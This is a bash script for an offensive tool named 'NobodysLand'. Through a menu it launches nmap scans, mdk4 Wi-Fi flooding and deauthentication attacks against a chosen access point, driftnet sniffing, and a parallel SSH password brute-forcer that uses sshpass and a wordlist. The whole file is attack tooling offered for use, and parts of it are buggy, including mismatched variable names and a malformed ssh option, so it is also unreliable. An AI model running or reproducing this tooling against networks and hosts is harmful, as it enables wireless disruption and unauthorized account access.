cyan='\e[0;36m' 
green='\033[92m'  
red='\e[1;31m' 
yel='\e[0;33m' 
orange='\e[38;5;166m'
purple='\e[1;31m'

clear

echo -e $purple""


echo "███╗   ██╗ ██████╗ ██████╗  ██████╗ ██████╗ ██╗   ██╗███████╗"
echo "████╗  ██║██╔═══██╗██╔══██╗██╔═══██╗██╔══██╗╚██╗ ██╔╝██╔════╝"
echo "██╔██╗ ██║██║   ██║██████╔╝██║   ██║██║  ██║ ╚████╔╝ ███████╗"
echo "██║╚██╗██║██║   ██║██╔══██╗██║   ██║██║  ██║  ╚██╔╝  ╚════██║"
echo "██║ ╚████║╚██████╔╝██████╔╝╚██████╔╝██████╔╝   ██║   ███████║"
echo "╚═╝  ╚═══╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═════╝    ╚═╝   ╚══════╝"

echo "██╗      █████╗ ███╗   ██╗██████╗ "                         
echo "██║     ██╔══██╗████╗  ██║██╔══██╗"                           
echo "██║     ███████║██╔██╗ ██║██║  ██║"                           
echo "██║     ██╔══██║██║╚██╗██║██║  ██║"                           
echo "███████╗██║  ██║██║ ╚████║██████╔╝"                           
echo "╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ "                           
                                                             


echo -e $cyan"               [$green+$cyan] $green Developer: $red at0mik"
echo -e $cyan"               [$green+$cyan] $green Tool: $red NobodysLand"
echo -e $cyan"               [$green+$cyan] $green Codename: $red Hunter"
echo " "
echo -e $yel"                Turn your network into a dominated battlefield"

echo " "

echo -e $purple"︾︾︾︾︾︾︾︾︾︾︾︾︾︾"
echo -e $cyan" [$yel 1$cyan ] $yel Scanner"
echo -e $purple"========================="
echo -e $cyan" [$yel 2$cyan ] $yel Wireless Attacks"
echo -e $purple"========================="
echo -e $cyan" [$yel 3$cyan ] $yel All Attacks"
echo -e $purple"========================="
echo -e $cyan" [$yel 4$cyan ] $yel Man-In-The-Middle"
echo -e $purple"========================="
echo -e $cyan" [$yel 5$cyan ] $yel Site Attacks"
echo -e $purple"========================="
echo -e $cyan" [$yel 6$cyan ] $yel SSH Attacks"
echo -e $purple"︽︽︽︽︽︽︽︽︽︽︽︽︽︽"

echo -e $yel"               Happy Hacking! "

# "Input"

read -p " $USER@NobodysLand~#: " Input1

# "Scanner"

if [ $Input1 = "1" ] 
then 
figlet "Scanner" |lolcat
read -p " 》Target IP《 :" target1
nmap -A -Pn $target1  
fi

# "Wireless Attacks"

if [ $Input1 = "2" ]
then
clear
cd $HOME/NobodysLand/
bash 1.sh
fi

# "All Attacks"

if [ $Input1 = "3" ]
then 
figlet "All" |lolcat
figlet "Attacks" |lolcat
fi

if [ $Input1 = "3" ]
then
echo -e $cyan"Confirm ? [y/N]"
read -p " 》Choose《 :" Choose1
if [ $Choose = "y" ] 
then
read -p " 》target《 :" TargetAP1
iwconfig
read -p " 》Interface《 :" Interface
echo -e $cyan"[$green+$cyan] $green Starting..."

gnome-terminal \
--title="All Attacks - NobodysLand" \
--working-directory="$HOME" \
--command="bash -c \"sudo mdk4 $Interface a ; \
exec bash\"" \

gnome-terminal \
--title="All Attacks - NobodysLand" \
--working-directory="$HOME" \
--command="bash -c \"sudo mdk4 $Interface b ; \
exec bash\"" \

gnome-terminal \
--title="All Attacks - NobodysLand" \
--working-directory="$HOME" \
--command="bash -c \"sudo mdk4 $Interface d ; \
exec bash\"" \

gnome-terminal \
--title="All Attacks - NobodysLand" \
--working-directory="$HOME" \
--command="bash -c \"sudo mdk4 $Interface m -t $TargetAP1 ; \
exec bash\"" \

gnome-terminal \
--title="All Attacks - NobodysLand" \
--working-directory="$HOME" \
--command="bash -c \"sudo mdk4 $Interface w -e $TargetAP1 -z ; \
exec bash\"" \

fi
fi

# "Man-In-The-Middle"

if [ $Input1 = "4" ]
then
figlet "MITM" |lolcat
iwconfig
read -p " 》Interface《 :" target2
xterm -hold -e driftnet -i $target2
fi

# "Site Attacks"

if [ $Input1 = "5" ]
then
clear
cd $HOME/NobodysLand/
bash 2.sh 
fi

if [ $Input1 = "6" ] 
then
clear
figlet "SSH" |lolcat
figlet "Attacks" |lolcat
read -p " 》Target《 :" target3
read -p " 》Wordlist《 :" wordlist
read -p " 》Port《 :" port1
count=0; while [ true ]; do start=$((1+$count)) end=$((5+$count)); for pass in $(sed -n ''$start','$end'p'$wordlist); do {(sshpass -p $pass ssh -o StrictHostKey=no $target3 -p $port1 "whoami" && echo $cyan[$green Found!$cyan ]$cyan pass: $pass && kill -2 $$;)} & done ;wait $!; let count+=5;done 
sleep 1
Login="ssh $USER@$target3 -p $port1"
Login
echo -e "$pass"
echo -e ""
fi
